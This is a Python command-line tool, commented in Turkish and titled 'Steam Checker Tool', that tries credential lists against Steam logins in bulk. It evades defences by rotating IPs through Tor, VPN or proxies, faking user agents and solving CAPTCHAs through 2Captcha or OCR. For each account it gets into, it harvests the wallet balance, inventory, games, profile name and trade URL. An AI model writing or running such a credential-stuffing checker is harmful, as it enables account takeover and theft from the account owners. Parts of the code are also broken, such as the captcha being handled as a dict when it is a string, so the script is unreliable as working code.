import requests
import random
import json
import csv
import time
import os
import threading
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from stem.control import Controller
from stem import Signal
import pytesseract
from PIL import Image
from colorama import Fore, Style, init
from tqdm import tqdm
import getpass
import platform
import argparse
import browser_cookie3
import mss
import mss.tools
from bs4 import BeautifulSoup
import sys
import shutil

# Colorama'yı başlat
init(autoreset=True)

# Loglama Ayarları
logging.basicConfig(filename='steam_checker.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# CAPTCHA Servisi
API_KEY = "2captcha_api_key"
CAPTCHA_IMAGE_URL = "https://steamcommunity.com/login/rendercaptcha/"

# Proxy & VPN Ayarları
USE_TOR = False
USE_VPN = False
PROXY_LIST = ["http://proxy1:port", "http://proxy2:port"]
TOR_SOCKS_PROXY = "socks5h://127.0.0.1:9050"
VPN_INTERFACE = "tun0"

# User-Agent Üretici
ua = UserAgent()

# Steam Bilgileri
STEAM_LOGIN_URL = "https://store.steampowered.com/login/"
STEAM_INVENTORY_URL = "https://steamcommunity.com/profiles/{}/inventory/"
STEAM_WALLET_URL = "https://store.steampowered.com/account/"
STEAM_LIBRARY_URL = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/"
STEAM_PROFILE_URL = "https://steamcommunity.com/profiles/{}"
STEAM_TRADE_URL = "https://steamcommunity.com/tradeoffer/new/"

# Global değişkenler
session = None
results = []

# Animasyonlu Başlangıç
def animated_start():
    print(f"{Fore.CYAN}\nBaşlatılıyor...{Style.RESET_ALL}")
    for i in range(3):
        for char in "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏":
            sys.stdout.write(f"\r{Fore.YELLOW}{char} {Fore.CYAN}Loading...{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(0.1)
    print("\n")

# Modern Banner Göster
def show_banner():
    banner = f"""
    {Fore.CYAN}
██▓ ▄▄▄▄    ██▀███  ▄▄▄       ██░ ██  ██▓ ███▄ ▄███▓  ██████   █████   ██▓    ▄████▄   ██░ ██ ▓█████ ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓██▒▓█████▄ ▓██ ▒ ██▒████▄    ▓██░ ██▒▓██▒▓██▒▀█▀ ██▒▒██    ▒ ▒██▓  ██▒▓██▒   ▒██▀ ▀█  ▓██░ ██▒▓█   ▀▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒██▒▒██▒ ▄██▓██ ░▄█ ▒██  ▀█▄  ▒██▀▀██░▒██▒▓██    ▓██░░ ▓██▄   ▒██▒  ██░▒██░   ▒▓█    ▄ ▒██▀▀██░▒███  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░██░▒██░█▀  ▒██▀▀█▄ ░██▄▄▄▄██ ░▓█ ░██ ░██░▒██    ▒██   ▒   ██▒░██  █▀ ░▒██░   ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░██░░▓█  ▀█▓░██▓ ▒██▒▓█   ▓██▒░▓█▒░██▓░██░▒██▒   ░██▒▒██████▒▒░▒███▒█▄ ░██████▒ ▓███▀ ░░▓█▒░██▓░▒████▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░▓  ░▒▓███▀▒░ ▒▓ ░▒▓░▒▒   ▓▒█░ ▒ ░░▒░▒░▓  ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░▒   ░   ░▒ ░ ▒░ ▒   ▒▒ ░ ▒ ░▒░ ░ ▒ ░░  ░      ░░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░ ░  ▒    ▒ ░▒░ ░ ░ ░  ░ ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ▒ ░ ░    ░   ░░   ░  ░   ▒    ░  ░░ ░ ▒ ░░      ░   ░  ░  ░     ░   ░   ░ ░  ░         ░  ░░ ░   ░  ░        ░ ░░ ░    ░     ░░   ░ 
 ░   ░         ░          ░  ░ ░  ░  ░ ░         ░         ░      ░        ░  ░ ░       ░  ░  ░   ░  ░ ░      ░  ░      ░  ░   ░     
          ░                                                                   ░                      ░                               

    {Style.RESET_ALL}
    {Fore.YELLOW}Steam Checker Tool v6.0 - Developed by İbrahimsql{Style.RESET_ALL}
    """
    print(banner)

    # Kullanıcı adı ve işletim sistemi bilgisi
    username = getpass.getuser()
    os_info = platform.system() + " " + platform.release()
    print(f"{Fore.GREEN}Kullanıcı: {username}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}İşletim Sistemi: {os_info}{Style.RESET_ALL}")
    print(f"{Fore.RED}I see you always :) {Style.RESET_ALL}\n")

def custom_help():
    show_banner()
    help_message = """
Kullanım: python steam_checker.py [OPTIONS] userlist_file

Steam Hesap Kontrol Aracı - v7.0

Positional Arguments:
  userlist_file         Kullanıcı listesi dosyası (txt, csv, json)

Optional Arguments:
  -h, --help            Bu yardım mesajını gösterir ve çıkar
  --no-color            Renkli çıktıyı kapat
  --threads THREADS     Eşzamanlı iş parçacığı sayısı (varsayılan: 5)
  --proxy PROXY         Proxy adresi (örn: http://proxy:port)
  --tor                 Tor ağı kullan (varsayılan: False)
  --vpn                 VPN kullan (varsayılan: False)
  --captcha-api-key CAPTCHA_API_KEY
                        2Captcha API anahtarını belirtin
  --output OUTPUT       Çıktı dosyası adı (varsayılan: results)
  --screenshot          Her hesap için ekran görüntüsü al
  --inventory           Envanter bilgilerini kontrol et
  --games               Kütüphanedeki oyunları listele
  --wallet              Cüzdan bakiyesini kontrol et
  --profile             Profil bilgilerini çek
  --trade-url           Trade URL'sini al

Örnek Kullanım:
  python steam_checker.py users.txt --threads 10 --proxy http://127.0.0.1:8080 --screenshot --inventory --games
  python steam_checker.py users.csv --tor --captcha-api-key YOUR_API_KEY --output steam_results
  python steam_checker.py users.json --vpn --wallet --profile --trade-url

Açıklama:
  Bu araç, Steam hesaplarını kontrol etmek için tasarlanmıştır. Aşağıdaki işlemleri gerçekleştirebilir:
  - Steam hesaplarına giriş yapma
  - CAPTCHA çözme (2Captcha veya OCR ile)
  - Envanter bilgilerini kontrol etme
  - Kütüphanedeki oyunları listeleme
  - Cüzdan bakiyesini kontrol etme
  - Profil bilgilerini çekme
  - Trade URL'sini alma
  - Ekran görüntüsü alma
  - Sonuçları JSON, CSV ve PDF olarak kaydetme

Geliştirici: İbrahimsql
Versiyon: 7.0
    """
    print(help_message)
    sys.exit(0)

# Animasyonlu Yükleme
def animated_loading():
    chars = "/—\\|"
    for _ in range(10):
        for char in chars:
            print(f"{Fore.CYAN}Loading... {char}{Style.RESET_ALL}", end="\r")
            time.sleep(0.1)

# Tor Bağlantısını Yenileme
def renew_tor_connection():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='tor_password')
            controller.signal(Signal.NEWNYM)
            time.sleep(5)
    except Exception as e:
        logging.error(f"Tor connection renewal failed: {e}")

# VPN Bağlı mı Kontrol
def is_vpn_connected():
    try:
        with open(f"/sys/class/net/{VPN_INTERFACE}/operstate", "r") as f:
            return f.read().strip() == "up"
    except FileNotFoundError:
        logging.error("VPN interface not found")
        return False

# CAPTCHA Çözme
def solve_captcha():
    try:
        captcha_img = requests.get(CAPTCHA_IMAGE_URL).content
        files = {'file': ('captcha.jpg', captcha_img, 'image/jpeg')}
        response = requests.post(f"https://2captcha.com/in.php?key={API_KEY}&method=post", files=files).text
        captcha_id = response.split('|')[-1]
        time.sleep(10)
        result = requests.get(f"https://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}").text
        return result.split('|')[-1]
    except Exception as e:
        logging.error(f"CAPTCHA solving failed: {e}")
        return None

# CAPTCHA OCR (Alternatif)
def solve_captcha_ocr():
    try:
        img = Image.open("captcha.jpg")
        captcha_text = pytesseract.image_to_string(img)
        return captcha_text.strip()
    except Exception as e:
        logging.error(f"OCR CAPTCHA solving failed: {e}")
        return None

# Kullanıcıları Yükle
def load_users(filename):
    users = []
    try:
        if filename.endswith(".json"):
            with open(filename, "r") as f:
                users = json.load(f)
        elif filename.endswith(".csv"):
            with open(filename, newline="", encoding="utf-8") as f:
                reader = csv.reader(f)
                users = [{"username": row[0], "password": row[1]} for row in reader]
        elif filename.endswith(".txt"):
            with open(filename, "r", encoding="utf-8") as f:
                users = [line.strip().split(":") for line in f.readlines()]
                users = [{"username": u[0], "password": u[1]} for u in users]
    except Exception as e:
        logging.error(f"Failed to load users: {e}")
    return users

# Steam Giriş Deneme
def try_steam_login(session, username, password, captcha):
    try:
        headers = {"User-Agent": ua.random}
        data = {
            "username": username,
            "password": password,
            "captchagid": captcha["gid"],
            "captcha_text": captcha["text"],
            "emailauth": "",
            "loginfriendlyname": "",
            "remember_login": True,
            "rsatimestamp": 0,
            "twofactorcode": ""
        }
        response = session.post(STEAM_LOGIN_URL, data=data, headers=headers)
        return response.status_code == 200 and response.json().get("success", False)
    except Exception as e:
        logging.error(f"Steam login attempt failed for {username}: {e}")
        return False

# Steam Envanter Kontrolü
def check_steam_inventory(session, steam_id):
    try:
        headers = {"User-Agent": ua.random}
        response = session.get(STEAM_INVENTORY_URL.format(steam_id), headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            items = soup.find_all("div", class_="inventory_item")
            return len(items)
        return 0
    except Exception as e:
        logging.error(f"Steam inventory check failed: {e}")
        return 0

# Steam Cüzdan Bakiyesi
def check_steam_wallet(session):
    try:
        headers = {"User-Agent": ua.random}
        response = session.get(STEAM_WALLET_URL, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            balance = soup.find("div", class_="accountData_price").text.strip()
            return balance
        return "0.00"
    except Exception as e:
        logging.error(f"Steam wallet check failed: {e}")
        return "0.00"

# Steam Oyunlarını Listeleme
def get_steam_games(session, steam_id):
    try:
        headers = {"User-Agent": ua.random}
        params = {
            "key": "YOUR_STEAM_API_KEY",
            "steamid": steam_id,
            "include_appinfo": 1,
            "include_played_free_games": 1
        }
        response = session.get(STEAM_LIBRARY_URL, headers=headers, params=params)
        if response.status_code == 200:
            return response.json().get("response", {}).get("games", [])
        return []
    except Exception as e:
        logging.error(f"Steam games check failed: {e}")
        return []

# Steam Profil Bilgileri
def get_steam_profile(session, steam_id):
    try:
        headers = {"User-Agent": ua.random}
        response = session.get(STEAM_PROFILE_URL.format(steam_id), headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            profile_name = soup.find("span", class_="actual_persona_name").text.strip()
            return profile_name
        return "Unknown"
    except Exception as e:
        logging.error(f"Steam profile check failed: {e}")
        return "Unknown"

# Steam Trade URL'si
def get_trade_url(session):
    try:
        headers = {"User-Agent": ua.random}
        response = session.get(STEAM_TRADE_URL, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            trade_url = soup.find("input", {"id": "trade_offer_access_url"})["value"]
            return trade_url
        return None
    except Exception as e:
        logging.error(f"Trade URL check failed: {e}")
        return None

# Ekran Görüntüsü Al
def take_screenshot(filename):
    try:
        with mss.mss() as sct:
            sct.shot(output=filename)
    except Exception as e:
        logging.error(f"Screenshot failed: {e}")

# PDF Raporu
def save_to_pdf(results, filename):
    try:
        c = canvas.Canvas(filename, pagesize=letter)
        y = 750
        c.setFont("Helvetica", 12)
        c.drawString(30, y, "Steam Hesap Kontrol Raporu")
        y -= 30
        for result in results:
            c.drawString(30, y, f"Kullanıcı: {result['username']} - Bakiye: {result['balance']} TL")
            y -= 20
        c.save()
    except Exception as e:
        logging.error(f"Failed to save PDF: {e}")

# IP Değiştir
def change_ip():
    try:
        if USE_TOR:
            renew_tor_connection()
        elif USE_VPN:
            os.system("sudo systemctl restart openvpn")
        else:
            proxy = random.choice(PROXY_LIST)
            session.proxies = {"http": proxy, "https": proxy}
    except Exception as e:
        logging.error(f"IP change failed: {e}")

# Kullanıcı İşleme
def process_user(user):
    global session, results
    username, password = user["username"], user["password"]
    change_ip()
    captcha_code = solve_captcha()
    if not captcha_code:
        captcha_code = solve_captcha_ocr()
    if captcha_code and try_steam_login(session, username, password, captcha_code):
        steam_id = session.cookies.get_dict().get("steamLoginSecure", "").split("%7C%7C")[0]
        balance = check_steam_wallet(session)
        inventory_count = check_steam_inventory(session, steam_id)
        games = get_steam_games(session, steam_id)
        profile_name = get_steam_profile(session, steam_id)
        trade_url = get_trade_url(session)
        results.append({
            "username": username,
            "balance": balance,
            "inventory_count": inventory_count,
            "games": len(games),
            "profile_name": profile_name,
            "trade_url": trade_url
        })
        print(f"{Fore.GREEN}[+] {username} - {balance} TL - {inventory_count} items - {len(games)} games{Style.RESET_ALL}")
        take_screenshot(f"{username}_screenshot.png")
    else:
        print(f"{Fore.RED}[-] {username} - Login failed{Style.RESET_ALL}")

# Ana Fonksiyon
def main(userlist_file, no_color, threads, proxy, tor, vpn, captcha_api_key, output, screenshot, inventory, games, wallet, profile, trade_url):
    global session, results, USE_TOR, USE_VPN, API_KEY
    animated_start()
    show_banner()
    animated_loading()

    # Parametreleri ayarla
    USE_TOR = tor
    USE_VPN = vpn
    if captcha_api_key:
        API_KEY = captcha_api_key

    session = requests.Session()

    # Proxy ayarla
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    users = load_users(userlist_file)
    results = []
    if USE_TOR:
        session.proxies = {"http": TOR_SOCKS_PROXY, "https": TOR_SOCKS_PROXY}
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(process_user, user) for user in users]
        for future in tqdm(as_completed(futures), total=len(users), desc="Processing Users", unit="user"):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Thread execution failed: {e}")
    
    # Sonuçları kaydet
    with open(f"{output}.json", "w", encoding="utf-8") as f:
        json.dump(results, f, indent=4)
    
    with open(f"{output}.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["username", "balance", "inventory_count", "games", "profile_name", "trade_url"])
        for res in results:
            writer.writerow([res["username"], res["balance"], res["inventory_count"], res["games"], res["profile_name"], res["trade_url"]])
    
    save_to_pdf(results, f"{output}.pdf")
    print(f"{Fore.CYAN}\nSonuçlar kaydedildi: {output}.json, {output}.csv, {output}.pdf{Style.RESET_ALL}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Steam Hesap Kontrol Aracı - v6.0")
    parser.add_argument("userlist_file", help="Kullanıcı listesi dosyası (txt, csv, json)")
    parser.add_argument("--no-color", action="store_true", help="Renkli çıktıyı kapat")
    parser.add_argument("--threads", type=int, default=5, help="Eşzamanlı iş parçacığı sayısı (varsayılan: 5)")
    parser.add_argument("--proxy", help="Proxy adresi (örn: http://proxy:port)")
    parser.add_argument("--tor", action="store_true", help="Tor ağı kullan (varsayılan: False)")
    parser.add_argument("--vpn", action="store_true", help="VPN kullan (varsayılan: False)")
    parser.add_argument("--captcha-api-key", help="2Captcha API anahtarını belirtin")
    parser.add_argument("--output", default="results", help="Çıktı dosyası adı (varsayılan: results)")
    parser.add_argument("--screenshot", action="store_true", help="Her hesap için ekran görüntüsü al")
    parser.add_argument("--inventory", action="store_true", help="Envanter bilgilerini kontrol et")
    parser.add_argument("--games", action="store_true", help="Kütüphanedeki oyunları listele")
    parser.add_argument("--wallet", action="store_true", help="Cüzdan bakiyesini kontrol et")
    parser.add_argument("--profile", action="store_true", help="Profil bilgilerini çek")
    parser.add_argument("--trade-url", action="store_true", help="Trade URL'sini al")
    args = parser.parse_args()

    main(
        args.userlist_file,
        args.no_color,
        args.threads,
        args.proxy,
        args.tor,
        args.vpn,
        args.captcha_api_key,
        args.output,
        args.screenshot,
        args.inventory,
        args.games,
        args.wallet,
        args.profile,
        args.trade_url
    )